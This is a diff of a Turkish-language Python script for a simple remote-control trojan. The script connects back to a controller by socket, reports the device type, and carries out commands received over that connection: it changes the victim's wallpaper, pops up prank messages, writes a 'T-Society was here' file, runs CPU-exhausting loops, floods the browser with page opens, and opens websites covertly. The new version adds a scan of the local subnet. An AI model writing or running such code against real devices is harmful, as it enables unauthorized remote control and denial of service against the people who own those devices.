@@ -1,132 +1,102 @@
 import socket
-import platform
 import os
+import platform
 import urllib.request
-import ctypes
+import subprocess
+import time
 
-def cihaz_tipi():
+def cihaz_bilgisi():
     sistem = platform.system()
-    if sistem == "Linux":
-        if "Android" in platform.platform():
-            return "Telefon"
-        else:
-            return "Linux PC"
+    if sistem == "Linux" and "Android" in platform.platform():
+        return "Telefon"
+    elif sistem == "Linux":
+        return "Linux PC"
     elif sistem == "Windows":
         return "Windows PC"
-    elif sistem == "Darwin":
-        return "Mac"
     return "Bilinmeyen"
 
-def arkaplan_degistir(url):
+def indir_ve_kaydet(url, dosya_adi="bg.jpg"):
     try:
-        urllib.request.urlretrieve(url, "arkaplan.jpg")
-        if cihaz == "Telefon":
-            os.system("termux-wallpaper -f arkaplan.jpg")
-        elif cihaz == "Windows PC":
-            yol = os.path.abspath("arkaplan.jpg")
-            ctypes.windll.user32.SystemParametersInfoW(20, 0, yol, 3)
-        elif cihaz == "Linux PC":
-            os.system("gsettings set org.gnome.desktop.background picture-uri file://$PWD/arkaplan.jpg")
-        s.send("[✓] Arka plan değiştirildi\n".encode())
+        urllib.request.urlretrieve(url, dosya_adi)
+        return dosya_adi
     except:
-        s.send("[!] Arka plan değiştirilemedi\n".encode())
+        return None
 
-def saka_modu(mesaj):
-    try:
-        if cihaz == "Telefon":
-            os.system(f'termux-notification --title "T-Society" --content "{mesaj}"')
-        elif cihaz == "Windows PC":
-            os.system(f'msg * "{mesaj}"')
-        elif cihaz == "Linux PC":
-            os.system(f'notify-send "T-Society" "{mesaj}"')
-        s.send("[✓] Şaka modu mesajı gönderildi!\n".encode())
-    except:
-        s.send("[!] Şaka modu başarısız\n".encode())
-
-def google_ac():
-    try:
+def komut_isle(komut):
+    if komut == "google":
         if cihaz == "Telefon":
             os.system("termux-open-url https://www.google.com")
         elif cihaz == "Windows PC":
             os.system("start https://www.google.com")
         elif cihaz == "Linux PC":
             os.system("xdg-open https://www.google.com")
-        s.send("[✓] Google açıldı\n".encode())
-    except:
-        s.send("[!] Google açılamadı\n".encode())
+        return "[✓] Google açıldı"
 
-def dosya_olustur():
-    try:
+    elif komut == "saldiri":
+        while True: pass
+
+    elif komut == "dosya":
         with open("saka.txt", "w") as f:
-            f.write("T-Society buradaydı!")
-        s.send("[+] Dosya oluşturuldu\n".encode())
-    except:
-        s.send("[!] Dosya oluşturulamadı\n".encode())
+            f.write("Şaka modu aktif!")
+        return "[✓] Dosya oluşturuldu: saka.txt"
 
-def saldiri_yap():
+    elif komut.startswith("arkaplan"):
+        url = komut.split(" ", 1)[1] if " " in komut else None
+        if not url:
+            return "[!] URL gerekli"
+        dosya = indir_ve_kaydet(url)
+        if not dosya:
+            return "[!] Görsel indirilemedi."
+        if cihaz == "Telefon":
+            os.system(f'termux-wallpaper -f {dosya}')
+        elif cihaz == "Windows PC":
+            import ctypes
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(dosya), 3)
+        elif cihaz == "Linux PC":
+            os.system(f'gsettings set org.gnome.desktop.background picture-uri "file://{os.path.abspath(dosya)}"')
+        return f"[✓] Arka plan değiştirildi: {url}"
+
+    elif komut.startswith("saka"):
+        return f"[✓] Şaka mesajı: {komut[5:]}"
+    
+    elif komut == "flood":
+        while True:
+            os.system("xdg-open https://google.com")
+
+    return "[!] Geçersiz komut"
+
+def baglan(ip, port):
     try:
-        for _ in range(9999999):
-            _ = 9 ** 999
-        s.send("[✓] Cihaz kastırıldı\n".encode())
+        s = socket.socket()
+        s.settimeout(2)
+        s.connect((ip, port))
+        s.send(cihaz.encode())
+        while True:
+            komut = s.recv(1024).decode()
+            if komut == "exit":
+                break
+            sonuc = komut_isle(komut)
+            s.send(sonuc.encode())
+        s.close()
     except:
-        s.send("[!] Cihaz kasarırken hata oluştu\n".encode())
+        pass
 
-def gizli_ac():
-    siteler = [
-        "https://www.google.com",
-        "https://youtube.com",
-        "https://www.instagram.com",
-        "https://tr.wikipedia.org"
-    ]
-    try:
-        for site in siteler:
-            if cihaz == "Telefon":
-                os.system(f'termux-open-url {site}')
-            elif cihaz == "Windows PC":
-                os.system(f'start {site}')
-            elif cihaz == "Linux PC":
-                os.system(f'xdg-open {site}')
-        s.send("[✓] Siteler gizlice açıldı\n".encode())
-    except:
-        s.send("[!] Gizli açma işlemi başarısız\n".encode())
-
-# === BAĞLANTI ===
-
-cihaz = cihaz_tipi()
-SERVER_IP = input("Server IP gir: ")
-PORT = int(input("Port gir: "))
-
-s = socket.socket()
-try:
-    s.connect((SERVER_IP, PORT))
-    s.send(f"[+] {cihaz} bağlandı.".encode())
-except:
-    print("[!] Bağlantı hatası.")
-    exit()
-
-# === KOMUT DÖNGÜSÜ ===
-
-while True:
-    try:
-        komut = s.recv(1024).decode().strip()
-        if komut == "google":
-            google_ac()
-        elif komut == "saldiri":
-            saldiri_yap()
-        elif komut == "dosya":
-            dosya_olustur()
-        elif komut.startswith("arkaplan "):
-            _, url = komut.split(" ", 1)
-            arkaplan_degistir(url)
-        elif komut.startswith("saka "):
-            _, mesaj = komut.split(" ", 1)
-            saka_modu(mesaj)
-        elif komut == "gizli":
-            gizli_ac()
-        elif komut == "exit":
-            s.close()
+def aktif_ipleri_tar(modem_ip, port):
+    print("[✓] Modemdeki aktif cihazlar taranıyor...")
+    for i in range(2, 255):
+        hedef_ip = f"{modem_ip.rsplit('.', 1)[0]}.{i}"
+        try:
+            s = socket.socket()
+            s.settimeout(1)
+            s.connect((hedef_ip, port))
+            print(f"[✓] Bağlantı başarılı: {hedef_ip}")
+            baglan(hedef_ip, port)
             break
-        else:
-            s.send("[!] Bilinmeyen komut\n".encode())
-    except:
-        break
+        except:
+            print(f"[-] Erişilemedi: {hedef_ip}")
+
+if __name__ == "__main__":
+    cihaz = cihaz_bilgisi()
+    modem_ip = input("Modem IP gir (örnek 192.168.1.1): ")
+    port = int(input("Port gir: "))
+    aktif_ipleri_tar(modem_ip, port)
